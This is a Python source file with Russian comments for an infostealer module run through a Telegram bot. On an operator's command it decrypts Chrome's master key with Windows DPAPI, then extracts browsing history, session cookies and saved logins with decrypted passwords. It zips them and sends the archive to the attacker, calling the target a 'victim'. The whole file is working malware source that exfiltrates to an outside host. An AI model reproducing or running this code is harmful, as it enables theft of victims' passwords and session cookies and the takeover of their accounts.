# ---- Imports ---- #
import os # https://docs.python.org/3/library/os.html
import win32crypt # https://pypi.org/project/pywin32/
import json, base64 # Импортируем json и base64 [Декодер]
from os.path import basename # Функция basename() модуля os.path возвращает базовое имя пути
from datetime import datetime, timedelta # И сказать нечего
from Crypto.Cipher import AES # https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html [туть]
import shutil # Высоко-уровневые операции с файлами
import sqlite3 # База данных
from aiogram import types # Основа aiogram :/
# ---- Imports ---- #

###############################################################################
#                                CHROME                                       #
###############################################################################
def Chrome(dp, bot, admin_id): # Простая функция
    @dp.message_handler(text_contains='Логи Chrome') # Если сообщение содержит такой текст
    async def chrome(message: types.Message): # Асинхронная функция внутри простой, хД
        await bot.send_message(admin_id, 'Тебя, понял. Занят этим..') # Отправляет админу сообщение
        try: # ПоПрОбОвАтЬ
            def time(date): # Снова функция
                try: # ПопРобОваТь
                    return str(datetime(1601, 1, 1) + timedelta(microseconds=date)) # Возвращает время
                except: # except
                    return "Can't decode" # Вовращает сообщение 

            async def get_master_key_chrome(): # async функция
                try: # Попробовать
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f: # Открытие 
                        local_state = f.read() # file.read
                        local_state = json.loads(local_state) # Метод считывает строку в формате JSON и возвращает объекты
                    master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) # Декодер
                    master_key_chrome = master_key_chrome[5:] # Хз как обьяснить)
                    master_key_chrome = win32crypt.CryptUnprotectData(master_key_chrome, None, None, None, 0)[1] # На нём все стиллеры пишут ))
                    return master_key_chrome # Возвращение
                except: # except
                    await bot.send_message(admin_id, 'Жертва не имеет Chrome Браузер') # Провал
            def decrypt(buff, master_key): # Функция (уже говорил что def это функция))
                try: # Попробовать
                    return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode() # return
                except: # except
                    return "Can't decode" # Возвращение провала



            try: # Попробовать
                os.makedirs(r'C:\hesoyam8927163\Chrome') # Сделать папку
                HistorySQL = "SELECT url FROM visits" # Новая переменная 
                HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d" # Еще одна переменная
                data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default" # Уже писал что это в main.py
                files = os.listdir(data_path) # Показать директорию
                history_db = os.path.join(data_path, 'history') # Функция join() правильно соединяет переданный путь к одному или более компонентов пути
                shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db') # Шутил ,_,
                c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db') # Функция `connect() открывает соединение с файлом базы данных
                cursor = c.cursor() # Курсор
                temp = [] # "Пустая" переменная
                with open(rf"C:\hesoyam8927163\Chrome\history-chrome.txt", "a", encoding="utf-8") as history: # Открытие
                    for result in cursor.execute(HistorySQL).fetchall(): # Цикл
                        data = cursor.execute(HistoryLinksSQL % result[0]).fetchone() # () Метод execute() помогает нам выполнять запрос и возвращать записи в соответствии с запросом
                        result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n" # result
                        if result in temp:
                            continue
                        temp.append(result)
                        history.write(result)
                    history.close()
                try:
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
                except:
                    pass
         
         # Кароче я задолбался комментировать весь код, там все идет примерно как выше

                CookiesSQL = "SELECT * FROM cookies"
                data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\Network"
                files = os.listdir(data_path)
                history_db = os.path.join(data_path, 'Cookies')
                shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                cursor = c.cursor()
                
                
                results = '[\n'

                result = cursor.execute(CookiesSQL).fetchall()

                for result in cursor.execute(CookiesSQL).fetchall():
                    if result[8] == 0:
                        secure = False
                    else:
                        secure = True

                    if result[9] == 0:
                        http = False
                    else:
                        http = True
                    results += '''
            {
                "domain": "%s",
                "expirationDate": %s,
                "name": "%s",
                "httpOnly": %s,
                "path": "%s",
                "secure": %s,
                "value": "%s"
            },
                    '''% (result[1], result[7], result[2], http, result[6], secure, decrypt(result[5], get_master_key_chrome()))

                with open(rf"C:\hesoyam8927163\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:
                    results = results.replace('True', 'true')
                    results = results.replace('False', 'false')
                    results += '\n]'
                    cookies.write(results)

                cookies.close()
                try:
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                except:
                    pass
            except:
                pass

            try:
                def get_master_key():
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key


                def decrypt_payload(cipher, payload):
                    return cipher.decrypt(payload)


                def generate_cipher(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)


                def decrypt_password(buff, master_key):
                    try:
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = generate_cipher(master_key, iv)
                        decrypted_pass = decrypt_payload(cipher, payload)
                        decrypted_pass = decrypted_pass[:-16].decode()  
                        return decrypted_pass
                    except:

                        return "Chrome < 80"    
            except:
                await bot.send_message(admin_id, 'Жертва не имеет Chrome Браузер')






            try:
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
                shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
                conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
                cursor = conn.cursor()

                
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)

                    alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                    with open(r'C:\hesoyam8927163\Chrome\chrome-passwords.txt', "a") as o:
                        o.write(alldatapass)

                shutil.make_archive('chrome', 'zip', 'C:\\hesoyam8927163\\Chrome')

                await bot.send_document(admin_id, open('chrome.zip', 'rb'))
                try:
                    os.remove('chrome.zip')
                    shutil.rmtree('C:\\hesoyam8927163')
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
                except Exception as e:
                    print(e)
            except Exception as e:
                print(e)
        except:
            await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Chrome :(')